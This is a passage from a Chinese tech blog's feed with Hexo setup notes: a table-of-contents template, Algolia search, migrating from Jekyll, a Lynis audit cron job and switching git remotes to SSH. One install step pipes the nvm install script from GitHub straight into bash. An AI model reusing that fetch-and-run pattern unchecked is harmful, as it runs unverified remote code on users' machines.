class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;<span class="selector-class">.show-toc-btn</span>&#123;<span class="attribute">display</span>:none;<span class="attribute">z-index</span>:<span class="number">10</span>;<span class="attribute">width</span>:<span class="number">30px</span>;<span class="attribute">min-height</span>:<span class="number">14px</span>;<span class="attribute">overflow</span>:hidden;<span class="attribute">padding</span>:<span class="number">4px</span> <span class="number">6px</span> <span class="number">8px</span> <span class="number">5px</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#ddd</span>;<span class="attribute">border-right</span>:none;<span class="attribute">position</span>:fixed;<span class="attribute">right</span>:<span class="number">40px</span>;<span class="attribute">text-align</span>:center;<span class="attribute">background-color</span>:<span class="number">#f9f9f9</span>&#125;<span class="selector-class">.show-toc-btn</span> <span class="selector-class">.btn-bg</span>&#123;<span class="attribute">margin-top</span>:<span class="number">2px</span>;<span class="attribute">display</span>:block;<span class="attribute">width</span>:<span class="number">16px</span>;<span class="attribute">height</span>:<span class="number">14px</span>;<span class="attribute">background</span>:<span class="built_in">url</span>(http://7xtawy.com1.z0.glb.clouddn.com/show.png) no-repeat;<span class="attribute">-webkit-background-size</span>:<span class="number">100%</span>;<span class="attribute">-moz-background-size</span>:<span class="number">100%</span>;<span class="attribute">background-size</span>:<span class="number">100%</span>&#125;<span class="selector-class">.show-toc-btn</span> <span class="selector-class">.btn-text</span>&#123;<span class="attribute">color</span>:<span class="number">#999</span>;<span class="attribute">font-size</span>:<span class="number">12px</span>&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">cursor</span>:pointer&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.btn-bg</span>&#123;<span class="attribute">background-position</span>:<span class="number">0</span> -<span class="number">16px</span>&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.btn-text</span>&#123;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">color</span>:<span class="number">#ea8010</span>&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span> <span class="selector-tag">li</span> <span class="selector-tag">ol</span>, <span class="selector-class">.toc-article</span> <span class="selector-tag">li</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span> <span class="selector-tag">ol</span>, <span class="selector-class">.toc-article</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改article-ejs文件"><a href="#修改article-ejs文件" class="headerlink" title="修改article.ejs文件"></a>修改article.ejs文件</h3><p>使用的是Hexo的toc函数，<a href="https://hexo.io/zh-cn/docs/helpers#toc" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/helpers#toc</a></p><p>打开 <code>themes\Landscape-x\layout\_partial\article.ejs</code>，在<code>&lt;header&gt;</code>标签添加下面代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 目录内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (!<span class="attr">index</span> &amp;&amp; <span class="attr">post.toc</span>)&#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"show-toc-btn"</span> <span class="attr">id</span>=<span class="string">"show-toc-btn"</span> <span class="attr">onclick</span>=<span class="string">"showToc();"</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"btn-bg"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"btn-text"</span>&gt;</span>文章导航<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"toc-article"</span> <span class="attr">class</span>=<span class="string">"toc-article"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"toc-close"</span> <span class="attr">class</span>=<span class="string">"toc-close"</span> <span class="attr">title</span>=<span class="string">"隐藏导航"</span> <span class="attr">onclick</span>=<span class="string">"showBtn();"</span>&gt;</span>×<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span> <span class="attr">class</span>=<span class="string">"toc-title"</span>&gt;</span>文章目录<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">%-</span> <span class="attr">toc</span>(<span class="attr">post.content</span>) %&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">showToc</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> toc_article = <span class="built_in">document</span>.getElementById(<span class="string">"toc-article"</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> show_toc_btn = <span class="built_in">document</span>.getElementById(<span class="string">"show-toc-btn"</span>);</span></span><br><span class="line"><span class="actionscript">toc_article.setAttribute(<span class="string">"style"</span>,<span class="string">"display:block"</span>);</span></span><br><span class="line"><span class="actionscript">show_toc_btn.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none"</span>);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">showBtn</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> toc_article = <span class="built_in">document</span>.getElementById(<span class="string">"toc-article"</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> show_toc_btn = <span class="built_in">document</span>.getElementById(<span class="string">"show-toc-btn"</span>);</span></span><br><span class="line"><span class="actionscript">toc_article.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none"</span>);</span></span><br><span class="line"><span class="actionscript">show_toc_btn.setAttribute(<span class="string">"style"</span>,<span class="string">"display:block"</span>);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 目录内容结束 --&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="添加目录"><a href="#添加目录" class="headerlink" title="添加目录"></a>添加目录</h3><p>在文章开头添加 <code>toc: true</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;有的文章比较长，翻页查阅比较麻烦，添加文章目录功能&lt;/p&gt;
&lt;h2 id=&quot;0x01-添加文章目录&quot;&gt;&lt;a href=&quot;#0x01-添加文章目录&quot; class=&quot;headerlink&quot; title=&quot;0x01 添加文章目录&quot;&gt;&lt;/a&gt;0x01 添加文章目录&lt;/h2&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="hexo" scheme="http://www.pa55w0rd.club/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>use_algolia_search</title>
    <link href="http://www.pa55w0rd.club/use-algolia-search/"/>
    <id>http://www.pa55w0rd.club/use-algolia-search/</id>
    <published>2018-11-20T06:04:40.000Z</published>
    <updated>2018-11-21T09:09:21.950Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>去<a href="https://www.algolia.com" target="_blank" rel="noopener">algolia</a>官网注册账号</p></li><li><p>新建index索引 Blog</p></li></ol><a id="more"></a><ol start="3"><li>在hex项目下安装 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># npm install hexo-algolia --save</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># export HEXO_ALGOLIA_INDEXING_KEY=xxxxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo algolia</span></span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Testing HEXO_ALGOLIA_INDEXING_KEY permissions.</span><br><span class="line"><span class="builtin-name">INFO</span>  Start processing</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Identified 45 pages <span class="keyword">and</span> posts <span class="keyword">to</span> index.</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Indexing chunk 1 of 1 (50 items each)</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Indexing done.</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;去&lt;a href=&quot;https://www.algolia.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;algolia&lt;/a&gt;官网注册账号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;新建index索引 Blog&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="hexo" scheme="http://www.pa55w0rd.club/tags/hexo/"/>
    
      <category term="algolia" scheme="http://www.pa55w0rd.club/tags/algolia/"/>
    
  </entry>
  
  <entry>
    <title>jekyll迁移hexo</title>
    <link href="http://www.pa55w0rd.club/jekyll%E8%BF%81%E7%A7%BBhexo/"/>
    <id>http://www.pa55w0rd.club/jekyll迁移hexo/</id>
    <published>2018-11-19T08:19:09.000Z</published>
    <updated>2018-11-23T07:54:58.359Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><a id="more"></a><h2 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h2><p>操作系统：Windows 10 子系统 Ubuntu 18.04 </p><p>使用apt install nodejs &amp;&amp; apt install npm 安装之后npm不能用</p><p>通过源码安装，npm也不能用</p><p>node还好，npm就是不能用，最后通过nvm安装成功</p><h3 id="安装node-npm"><a href="#安装node-npm" class="headerlink" title="安装node + npm"></a>安装node + npm</h3><ul><li><p>安装nvm</p>  <figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># source ~/.bashrc</span></span><br></pre></td></tr></table></figure></li><li><p>使用nvm</p>  <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># nvm ls-remote   <span class="comment">//列出远程所有可用版本</span></span><br><span class="line"># nvm install <span class="number">10.13</span><span class="number">.0</span> <span class="comment">//目前稳定LTS版</span></span><br><span class="line"># nvm ls <span class="comment">//查看已安装版本</span></span><br><span class="line"># nvm use <span class="number">10.13</span><span class="number">.0</span> <span class="comment">//切换到版本</span></span><br><span class="line"><span class="comment">//如果想把某个版本设为默认，可以这么做：</span></span><br><span class="line"># nvm alias <span class="section">default</span> <span class="number">10.13</span><span class="number">.0</span></span><br><span class="line"># nvm use <span class="section">default</span></span><br></pre></td></tr></table></figure></li><li><p>换源</p><p>  官方源可能会被墙，需要换源</p><p>  使用源管理工具 nrm</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># npm i -g nrm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nrm ls</span></span><br><span class="line"></span><br><span class="line"><span class="string">*</span> <span class="string">npm</span> <span class="bullet">----</span> <span class="attr">https://registry.npmjs.org/</span></span><br><span class="line">  <span class="string">cnpm</span> <span class="meta">---</span> <span class="attr">http://r.cnpmjs.org/</span></span><br><span class="line">  <span class="string">taobao</span> <span class="bullet">-</span> <span class="attr">https://registry.npm.taobao.org/</span></span><br><span class="line">  <span class="string">nj</span> <span class="bullet">-----</span> <span class="attr">https://registry.nodejitsu.com/</span></span><br><span class="line">  <span class="string">rednpm</span> <span class="bullet">-</span> <span class="attr">http://registry.mirror.cqupt.edu.cn/</span></span><br><span class="line">  <span class="string">npmMirror</span>  <span class="attr">https://skimdb.npmjs.com/registry/</span></span><br><span class="line">  <span class="string">edunpm</span> <span class="bullet">-</span> <span class="attr">http://registry.enpmjs.org/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nrm use taobao  //切换淘宝源</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><pre><code><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># apt-get install git</span></span><br></pre></td></tr></table></figure></code></pre><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-<span class="keyword">cli</span></span><br></pre></td></tr></table></figure></code></pre><h2 id="0x02-简单使用"><a href="#0x02-简单使用" class="headerlink" title="0x02 简单使用"></a>0x02 简单使用</h2><h3 id="初始化-init"><a href="#初始化-init" class="headerlink" title="初始化 init"></a>初始化 init</h3><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo init &lt;folder&gt;</span></span><br><span class="line"><span class="meta"># cd &lt;folder&gt;</span></span><br><span class="line"><span class="meta"># npm install</span></span><br></pre></td></tr></table></figure></p><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="variable">_config</span>.yml     <span class="comment">//配置信息</span></span><br><span class="line">├── package.json    <span class="comment">//应用程序信息</span></span><br><span class="line">├── scaffolds       <span class="comment">//模板文件夹</span></span><br><span class="line">├── source      <span class="comment">//资源文件夹</span></span><br><span class="line">|   ├── <span class="variable">_drafts</span></span><br><span class="line">|   └── <span class="variable">_posts</span>  <span class="comment">//文章</span></span><br><span class="line">└── themes      <span class="comment">//主题文件夹</span></span><br></pre></td></tr></table></figure><h3 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h3><p>创建 Hexo 主题非常容易，您只要在 themes 文件夹内，新增一个任意名称的文件夹，并修改 _config.yml 内的 theme 设定，即可切换主题。一个主题可能会有以下的结构：<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── languages</span><br><span class="line">├── <span class="keyword">layout</span></span><br><span class="line">├── scripts</span><br><span class="line">└── <span class="keyword">source</span></span><br></pre></td></tr></table></figure></p><p><strong>_config.yml</strong></p><p>主题的配置文件。修改时会自动更新，无需重启服务器。</p><h3 id="新建文章-new"><a href="#新建文章-new" class="headerlink" title="新建文章 new"></a>新建文章 new</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo new [layout] <span class="meta-string">&lt;title&gt;</span></span></span><br></pre></td></tr></table></figure><p>新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><h3 id="生成静态文件-generate"><a href="#生成静态文件-generate" class="headerlink" title="生成静态文件 generate"></a>生成静态文件 generate</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># hexo <span class="keyword">generate</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-d, –deploy</td><td>文件生成后立即部署网站</td></tr><tr><td>-w, –watch</td><td>监视文件变动</td></tr></tbody></table><h3 id="启动本地服务器-server"><a href="#启动本地服务器-server" class="headerlink" title="启动本地服务器 server"></a>启动本地服务器 server</h3><p>hexo3.0 把服务器独立成单独的模块，需要先安装才能使用<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># npm install hexo-server --save</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># hexo server</span></span><br></pre></td></tr></table></figure></p><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-p, –port</td><td>重设端口</td></tr><tr><td>-s, –static</td><td>只使用静态文件</td></tr><tr><td>-l, –log</td><td>启动日记记录，使用覆盖记录格式</td></tr></tbody></table><h3 id="部署-deploy"><a href="#部署-deploy" class="headerlink" title="部署 deploy"></a>部署 deploy</h3><p>Hexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。</p><p>先安装<code>hexo-deployer-git</code>模块</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># npm install hexo-deployer-git --save</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># hexo deploy</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-g, –generate</td><td>部署之前预先生成静态文件</td></tr></tbody></table><p>在 <code>_config.yml</code> 中修改参数，可以同时使用多个deployer<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line">  <span class="attribute">type</span>: git</span><br><span class="line">  <span class="attribute">message</span>: <span class="string">"Update My Blog"</span></span><br><span class="line">  <span class="attribute">branch</span>: master</span><br><span class="line">  <span class="attribute">repository</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:Pa55w0rd/pa55w0rd-new.github.io.git</span><br></pre></td></tr></table></figure></p><h3 id="清除-clean"><a href="#清除-clean" class="headerlink" title="清除 clean"></a>清除 clean</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo clean</span></span><br></pre></td></tr></table></figure><h3 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo g</span></span><br><span class="line"><span class="meta"># hexo s</span></span><br><span class="line"><span class="meta"># hexo d</span></span><br></pre></td></tr></table></figure><h2 id="0x03-jekyll-迁移至hexo"><a href="#0x03-jekyll-迁移至hexo" class="headerlink" title="0x03 jekyll 迁移至hexo"></a>0x03 jekyll 迁移至hexo</h2><p>把<code>_posts</code>文件夹内的所有文件复制到<code>source/_posts</code> 文件夹，并在<code>_config.yml</code>中修改 <code>new_post_name</code>参数。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">new_post_name:</span> <span class="symbol">:year-</span><span class="symbol">:month-</span><span class="symbol">:day-</span><span class="symbol">:title</span>.md</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="hexo" scheme="http://www.pa55w0rd.club/tags/hexo/"/>
    
      <category term="迁移" scheme="http://www.pa55w0rd.club/tags/%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
  <entry>
    <title>Lynis + ansible</title>
    <link href="http://www.pa55w0rd.club/lynis/"/>
    <id>http://www.pa55w0rd.club/lynis/</id>
    <published>2018-11-16T07:57:42.000Z</published>
    <updated>2018-12-03T09:36:52.536Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="git clone https://github.com/CISOfy/lynis">项目地址</a></p></blockquote><p>Lynis是一款面向Linux、Mac OS X、BSD以及Solaris等Unix类系统的安全审计与强化工具。它能够深入扫描并检测系统中的问题、存在漏洞的软件包以及配置设置，并提出相关解决建议。Lynis能够轻松实现安全评估、合规性测试、漏洞检测、配置管理以及补丁管理。 </p><a id="more"></a><p><strong>安装使用</strong><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CISOfy/</span>lynis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">lynis audit system</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置定时任务，如每天3点运行扫描，并将报告发送电子邮件地址</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span> <span class="number">3</span> * * * <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>lynis --quick <span class="number">2</span>&gt;&amp;<span class="number">1</span> | mail -s <span class="string">"Lynis Reports of My Server"</span> you@yourdomain.com</span><br></pre></td></tr></table></figure></p><p>ansible</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;git clone https://github.com/CISOfy/lynis&quot;&gt;项目地址&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Lynis是一款面向Linux、Mac OS X、BSD以及Solaris等Unix类系统的安全审计与强化工具。它能够深入扫描并检测系统中的问题、存在漏洞的软件包以及配置设置，并提出相关解决建议。Lynis能够轻松实现安全评估、合规性测试、漏洞检测、配置管理以及补丁管理。 &lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
  </entry>
  
  <entry>
    <title>Git修改远程URL</title>
    <link href="http://www.pa55w0rd.club/git_edit_remoteurl/"/>
    <id>http://www.pa55w0rd.club/git_edit_remoteurl/</id>
    <published>2018-11-06T09:04:11.000Z</published>
    <updated>2018-11-21T11:29:09.780Z</updated>
    
    <content type="html"><![CDATA[<p>Github 设置使用了ssh key，每次提交代码还是需要输入用户名？？？</p><a id="more"></a><p>检查发现，在设置远程url的时候使用了https</p><p><a href="https://github.com/Pa55w0rd/pa55w0rd.github.io.git" target="_blank" rel="noopener">https://github.com/Pa55w0rd/pa55w0rd.github.io.git</a></p><p>使用git remote set-url命令从https切换到ssh<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># git remote <span class="keyword">set</span>-url <span class="comment">origin git+ssh:</span>//<span class="comment">git@github.com</span>/Pa55w0rd/<span class="comment">pa55w0rd.github.io.git</span></span><br></pre></td></tr></table></figure></p><p>通过git remote -v命令验证是否成功<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git remote -v</span></span><br><span class="line"><span class="attribute">origin</span>  git+ssh://git<span class="variable">@github</span>.com/Pa55w0rd/pa55w0rd.github.io.git (fetch)</span><br><span class="line">origin  git+ssh://git<span class="variable">@github</span>.com/Pa55w0rd/pa55w0rd.github.io.git (push)</span><br></pre></td></tr></table></figure></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="建立远程仓库"><a href="#建立远程仓库" class="headerlink" title="建立远程仓库"></a>建立远程仓库</h3><p>进入GitHub，点击右上角 + 号，选择New repository</p><p>输入仓库名称，点击 Create repository</p><h3 id="建立本地仓库"><a href="#建立本地仓库" class="headerlink" title="建立本地仓库"></a>建立本地仓库</h3><p>建立目录，将文件夹初始化为git可以管理的仓库</p><p>git init</p><h3 id="与远程仓库关联"><a href="#与远程仓库关联" class="headerlink" title="与远程仓库关联"></a>与远程仓库关联</h3><p>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:Pa55w0rd/pa55w0rd.github.io.git</p><h3 id="添加到暂存区"><a href="#添加到暂存区" class="headerlink" title="添加到暂存区"></a>添加到暂存区</h3><p>git add .   </p><blockquote><p>注意最后边的 .</p></blockquote><h3 id="提交暂存区到仓库区"><a href="#提交暂存区到仓库区" class="headerlink" title="提交暂存区到仓库区"></a>提交暂存区到仓库区</h3><p>git commit -m “init”</p><h3 id="上传本地仓库到远程仓库"><a href="#上传本地仓库到远程仓库" class="headerlink" title="上传本地仓库到远程仓库"></a>上传本地仓库到远程仓库</h3><p>git push origin master</p><h3 id="显示变更的文件"><a href="#显示变更的文件" class="headerlink" title="显示变更的文件"></a>显示变更的文件</h3><p>git status</p><h3 id="克隆远程仓库到本地"><a href="#克隆远程仓库到本地" class="headerlink" title="克隆远程仓库到本地"></a>克隆远程仓库到本地</h3><p>git clone <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:Pa55w0rd/pa55w0rd.github.io.git</p><h3 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h3><p>参考 <a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">阮一峰_ 常用Git命令清单</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Github 设置使用了ssh key，每次提交代码还是需要输入用户名？？？&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="解决方法" scheme="http://www.pa55w0rd.club/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
</feed>
